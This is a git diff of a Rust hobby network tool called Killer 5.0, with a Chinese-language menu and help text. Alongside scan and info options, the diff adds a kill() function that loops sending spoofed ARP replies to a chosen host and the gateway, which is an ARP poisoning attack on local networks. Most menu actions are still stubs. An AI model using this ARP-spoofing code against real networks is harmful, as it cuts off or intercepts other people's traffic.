@@ -1,8 +1,47 @@
-use std::{fs, io::{self, BufRead, BufReader, Write}};
-use rand::Rng; // random tip text
-use colored::*; // terminal coloring
-use std::process; // exit program
-use std::path::Path;
+use clap::{Parser};
+use std::{fs, io::Write, path::Path, thread};
+use std::io::BufRead;
+use std::net::Ipv4Addr;
+use libkiller;
+use rand::Rng;
+use colored::*;
+use std::process;
+use std::str::FromStr;
+use std::time::Duration;
+use libkiller::send_arp_reply;
+use pnet::datalink::MacAddr;
+use serde::{Deserialize, Serialize};
+
+
+
+
+#[derive(Parser)]
+#[clap(version = "5.0", author = "xiaozhao45", disable_help_flag = true, disable_version_flag = true)]
+struct Args {
+    #[clap(short = 'k', long = "kill")]
+    kill: bool,
+
+    #[clap(short = 's', long = "scan")]
+    scan: bool,
+
+    #[clap(short = 'n', long = "net")]
+    net: bool,
+
+    #[clap(short = 'p', long = "port")]
+    port: bool,
+
+    #[clap(short = 'a', long = "about")]
+    about: bool,
+
+    #[clap(short = 'c', long = "command-list")]
+    command_list: bool,
+
+    #[clap(short = 'v', long = "version")]
+    version_info: bool,
+
+    #[clap(short = 'h', long = "help")]
+    help: bool,
+}
 
 fn first_run() {
     let workspace_path = "KillerWorkSpace";
@@ -33,104 +72,60 @@ fn check_initialization() -> bool {
     fs::metadata(killer_standard_path).is_ok() && fs::metadata(config_conf_path).is_ok()
 }
 
-// fn translate_and_print(text:&str){
-//     if launguage == "zh-CN"{
-//         println!("{}",text);
-//     } else if launguage == "en-US"{
-//         println!("{}",text);
-//     } else {
-//         println!("{}",text);
-//     }
-// }
-
 fn tiptext() -> String {
-
-
-    const TIPTEXT_01: &str = "建议您多开几个Killer程序，这很方便，由于Killer的单个功能使用后会直接退出，而不是返回到主界面";
-    const TIPTEXT_02: &str = "非常希望您在Github上反馈错误，在关于中有Github地址";
-    const TIPTEXT_03: &str = "Arp攻击属于网络攻击的一种，可能您需要为所有后果负责，请谨慎使用！";
-    const TIPTEXT_04: &str = "您可以单独运行Killer4.0的某功能，只需要在Github上下载对应Py文件并配置环境";
-    const TIPTEXT_05: &str = "Killer的Github地址：https://github.com/xiaozhao45/Killer";
-    const TIPTEXT_06: &str = "这个程序是我6年级的时候的一个小项目，希望您能喜欢！";
-    const TIPTEXT_07: &str = "这里是作者的一些提示，您完全可以相信这些提示。";
-    const TIPTEXT_08: &str = "Killer 5.0使用了Rust来重写，Killer 4.0则是纯Python开发。";
-    const TIPTEXT_09: &str = "至少未来5个版本，Killer将不会开发GUI版本";
-    const TIPTEXT_10: &str = "Killer的作者：xiaozhao45，如果您要Fork本项目，您可以修改这些提示信息，也可以留着，但请不要删除。";
-    const TIPTEXT_11: &str = "Killer 未来的开发趋势是自动化、多功能、跨平台，将专注于网络相关。";
-
-
     let mut rng = rand::thread_rng();
     let random_index = rng.gen_range(0..11);
 
     let tiptext = match random_index {
-        0 => TIPTEXT_01,
-        1 => TIPTEXT_02,
-        2 => TIPTEXT_03,
-        3 => TIPTEXT_04,
-        4 => TIPTEXT_05,
-        5 => TIPTEXT_06,
-        6 => TIPTEXT_07,
-        7 => TIPTEXT_08,
-        8 => TIPTEXT_09,
-        9 => TIPTEXT_10,
-        10 => TIPTEXT_11,
+        0 => "建议您多开几个Killer程序，这很方便，由于Killer的单个功能使用后会直接退出，而不是返回到主界面",
+        1 => "非常希望您在Github上反馈错误，在关于中有Github地址",
+        2 => "Arp攻击属于网络攻击的一种，可能您需要为所有后果负责，请谨慎使用！",
+        3 => "您可以单独运行Killer4.0的某功能，只需要在Github上下载对应Py文件并配置环境",
+        4 => "Killer的Github地址：https://github.com/xiaozhao45/Killer",
+        5 => "这个程序是我6年级的时候的一个小项目，希望您能喜欢！",
+        6 => "这里是作者的一些提示，您完全可以相信这些提示。",
+        7 => "Killer 5.0使用了Rust来重写，Killer 4.0则是纯Python开发。",
+        8 => "至少未来5个版本，Killer将不会开发GUI版本",
+        9 => "Killer的作者：xiaozhao45，如果您要Fork本项目，您可以修改这些提示信息，也可以留着，但请不要删除。",
+        10 => "Killer 未来的开发趋势是自动化、多功能、跨平台，将专注于网络相关。",
         _ => unreachable!(),
     };
 
     tiptext.to_string()
 }
 
-
-
-
-fn error_print(error_code:&str, error_message:&str, try_todo:&str){
+fn error_print(error_code: &str, error_message: &str, try_todo: &str) {
     println!();
-    println!("          致命错误：{}",error_code);
-    println!("  :(      错误信息：{}",error_message);
-    println!("          尝试解决：{}",try_todo);
+    println!("          致命错误：{}", error_code);
+    println!("  :(      错误信息：{}", error_message);
+    println!("          尝试解决：{}", try_todo);
     println!();
     std::process::exit(error_code.parse().unwrap());
-
 }
 
-// fn get_user_input(prompt: &str) -> String {
-//     println!("{}", prompt);
-
-//     let stdin = io::stdin();
-//     let mut reader = BufReader::new(stdin.lock());
-
-//     let mut user_input = String::new();
-//     reader.read_line(&mut user_input).expect("读取输入时发生错误");
-
-//     // 去除末尾的换行符
-//     user_input.trim_end().to_string()
-// }
-
-/// 从用户获取输入，并返回输入的内容。
 /// 从用户获取输入，并返回输入的内容。
 fn input(prompt: &str) -> String {
     print!("{}", prompt);
-    io::stdout().flush().unwrap(); // 确保提示符立即显示
+    std::io::stdout().flush().unwrap(); // 确保提示符立即显示
 
     let mut buffer = String::new();
 
     // 从标准输入读取一行
-    io::stdin().lock().read_line(&mut buffer).expect("读取输入时发生错误");
+    std::io::stdin().lock().read_line(&mut buffer).expect("读取输入时发生错误");
 
     // 去除末尾的换行符
     buffer.trim_end_matches('\n').to_string()
 }
 
 
+fn main() {
+    let args = Args::parse();
 
-
-
-fn main(){
-    let mut program_language = "zh-CN";
     if !check_initialization() {
         first_run();
     }
-    print!("Done!\n\n");   // print message
+
+    print!("Done!\n\n");
     print!(r#"
      _  __  _   _   _
     | |/ / (_) | | | |   ___   _ __
@@ -140,135 +135,97 @@ fn main(){
 
     "#);   // header text
 
-
-
     println!("{}", tiptext());
 
-
-    print!("{}", r#"
-
-    [K] 使用Arp攻击一个内网的计算机
-    "#.red());
+    println!("{}", r#"
+    [K] [Kill]          使用ARP协议来攻击局域网内的主机"#.red());
 
     println!("{}", r#"
-    [S] 扫描所有内网的活跃IP
-    [N] 获取本机IP、网关和MAC地址
-    [P] 扫描指定局域网IP的开放端口
-    [A] 关于这个程序&帮助页面
-    [C] 全部命令列表
-    [E] 退出程序
+    [S] [Scan]          扫描所有内网的活跃IP
+    [N] [Net]           获取本机IP、网关和MAC地址
+    [P] [Port]          扫描指定局域网IP的开放端口
+    [A] [About]         关于这个程序&帮助页面
+    [C] [CommandList]   全部命令列表
+
+    [E] [Exit]          退出程序
     "#.green());
 
-    loop {
-        let choice = input("Killer >>> ");
+    // 处理命令行参数
+    if args.kill {
+        println!("Killer Pre-view（ARP Attack）");
+        println!("警告：Pre-view版本暂时不开放功能，仅作为基础框架来编译");
+    } else if args.scan {
+        println!("Killer Pre-view (IP Scan)");
+        println!("警告：Pre-view版本暂时不开放功能，仅作为基础框架来编译");
+    } else if args.net {
+        println!("Killer Pre-view (Network Info)");
+        println!("警告：Pre-view版本暂时不开放功能，仅作为基础框架来编译");
+    } else if args.port {
+        println!("Killer Pre-view (Port Scan)");
+        println!("警告：Pre-view版本暂时不开放功能，仅作为基础框架来编译");
+    } else if args.about {
+        about();
+    } else if args.version_info {
+        print!("{}", r#"
+     _  __  _   _   _
+    | |/ / (_) | | | |   ___   _ __
+    | ' /  | | | | | |  / _ \ | '__|
+    | . \  | | | | | | |  __/ | |
+    |_|\_\ |_| |_| |_|  \___| |_|
 
-        match choice.as_str() {
-            "K" => {
-                kill()
-            },
-            "S" => {
-                scan()
-            },
-            "N" => {
-                net()
-            },
-            "P" => {
-                port()
-            },
-            "A" => {
-                about()
-            },
-            "C" => {
-                command_list()
-            },
-            "E" => {
-                println!("感谢使用!");
-                break;
-            },
-            _ => {
+    *********************
+    Killer 5.0"#.red());
 
-                println!("\n错误代码：0x04");
-                println!("非致命错误，无需异常退出。请检查输入")
+        println!("  Pre-view version");
+        println!(r#"
+    *************************
+    "#);
+    } else if args.command_list {
+        command_list();
+    } else if args.help {
+        help();
+    } else {
+        // 如果没有提供命令行参数，则进入交互模式
+        loop {
+            let choice = input("Killer >>> ").to_uppercase();
+
+            match choice.as_str() {
+                "K" => {
+                    println!("Killer Pre-view（ARP Attack）");
+                    // let this_ip = input("请输入你的IP地址，也可以输入其他非网关的IP地址：");
+                    // let ip = input("请输入目标IP地址：");
+                    // let mac = input("请输入目标MAC地址：");
+                    // let gateway = input("请输入网关IP地址：");
+                    //
+                    //
+                    // kill(ip.parse().unwrap(), this_ip.parse().unwrap(), mac.parse().unwrap(), gateway.parse().unwrap(), Default::default());
+                }
+                "S" => {
+                    println!("Killer Pre-view (IP Scan)");
+                }
+                "N" => {
+                    println!("Killer Pre-view (Network Info)");
+                }
+                "P" => {
+                    println!("Killer Pre-view (Port Scan)");
+                }
+                "A" => {
+                    about();
+                }
+                "C" => {
+                    command_list();
+                }
+                "E" => {
+                    println!("感谢使用!");
+                    break;
+                }
+                _ => {
+                    println!("\n错误代码：0x04");
+                    println!("非致命错误，无需异常退出。请检查输入");
+                }
             }
         }
-
     }
-}
-
-//
-//     //while loop
-//     while active {
-//         let mut command = input("Killer >>> ");
-//
-//         if command == "K" {
-//             println!("Killer Pre-view")
-//
-//         } else if command == "S" {
-//             println!("Killer Pre-view")
-//         } else if command == "N" {
-//             println!("Killer Pre-view")
-//
-//
-//         //     println!(r#"
-//         //     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//         //    ┃┃       NetWork Info
-//         //    ┃┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//         //    ┃┃ 网络状态 ：{}┃ 位置 ：{}
-//         //    ┃┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//         //    ┃┃ 网关地址 []
-//         //    ┃┃ 本机地址 []
-//         //    ┃┃ 物理地址 []
-//         //    ┃┣──────────────────────────━━
-//         //    ┃┃
-//         //    ┃┃
-//         //    ┃┃
-//         //    ┃┗━ ━━━━━━━━━━━━━━━┳━━━━━━━━
-//         //    ┗━ ━━━━━━━━━━━━━━━━┛
-//
-//         //     "#)
-//         } else if command == "P" {
-//             println!("Killer Pre-view")
-//         } else if command == "A" {
-
-//
-//
-//         } else if command == "C" {
-//             println!("Killer Pre-view");
-//             println!("当前语言：{}",program_language);
-//         } else if command == "E" {
-//             println!( "正在退出...");
-//             process::exit(0);
-//         } else {
-//             println!("未知命令，请重新输入！");
-//         }
-//     }
-// }
-
-
-// Anybody Here？
-
-
-
-//*****************************//
-//功能函数 - Kill;Scan;Net;Port //
-//*****************************//
-//Last Update: 2024/07/12
-//***********//
-
-fn kill() {
-    println!("Killer Pre-view")
-}
-
-fn scan() {
-    println!("Killer Pre-view")
-}
-
-fn net() {
-    println!("Killer Pre-view")
-}
-
-fn port() {
-    println!("Killer Pre-view")
 }
 
 fn about() {
@@ -305,7 +262,7 @@ fn about() {
 
 fn command_list() {
     println!(r#"
-    说明：首个方括号内为别名，第二个方括号内为完整命令名称，可以在终端中作为killer的参数使用，均无大小写要求。
+    命令列表说明：首个方括号内为别名，第二个方括号内为完整命令名称，可以在终端中作为killer的参数使用，有大小写要求。
 
     [S] [Scan]          扫描所有内网的活跃IP
     [N] [Net]           获取本机IP、网关和MAC地址
@@ -315,6 +272,53 @@ fn command_list() {
     [L] [Logfile]       输出日志文件
 
     [E] [Exit]          退出程序
-    "#)
-
+    "#);
 }
+
+fn kill(target_ip: Ipv4Addr, attacker_ip: Ipv4Addr, attacker_mac: MacAddr, gateway_ip: Ipv4Addr, gateway_mac: MacAddr) {
+    println!("Starting ARP attack on target IP: {}", target_ip);
+
+    // 持续发送 ARP 回复
+    loop {
+        // 向目标发送 ARP 回复，声称攻击者的 IP 地址对应于网关的 MAC 地址
+        if let Err(e) = send_arp_reply("", target_ip, <[u8; 6]>::from(gateway_mac), attacker_ip, <[u8; 6]>::from(attacker_mac)) {
+            println!("Failed to send ARP reply to target: {}", e);
+            break;
+        }
+
+        // 向网关发送 ARP 回复，声称攻击者的 IP 地址对应于目标的 MAC 地址
+        if let Err(e) = send_arp_reply("", gateway_ip, <[u8; 6]>::from(attacker_mac), attacker_ip, <[u8; 6]>::from(attacker_mac)) {
+            println!("Failed to send ARP reply to gateway: {}", e);
+            break;
+        }
+
+        thread::sleep(Duration::from_millis(10));
+    }
+}
+    fn help() {
+        println!(r#"
+    Killer v5.0   (杀手 v5.0)
+    这是 Killer 的 Rust 版本，旨在成为一个高性能和跨平台的程序。
+
+用法：
+        killer [选项]
+            或
+        ./killer [选项]
+
+        以上用法的"killer"请替换为Killer可执行文件的文件名。
+        若Killer没有在环境变量中，那么你需要在Killer可执行文件的目录中执行。
+        没有参数时，进入交互模式。
+        通过Killer-Toolkit安装的用户，可直接在任意终端中运行killer或Killer命令。
+
+选项：
+            -h， --help 显示此帮助消息
+            -v， --version 显示版本号
+            -a， --about 显示关于页面
+            -c， --command-list 显示命令列表
+            -s， --scan 扫描本地网络中所有活动 IP
+            -n， --net 获取本地 IP、网关和 MAC 地址
+            -p， --port 扫描指定局域网IP的开放端口
+
+    "#);
+    }
+
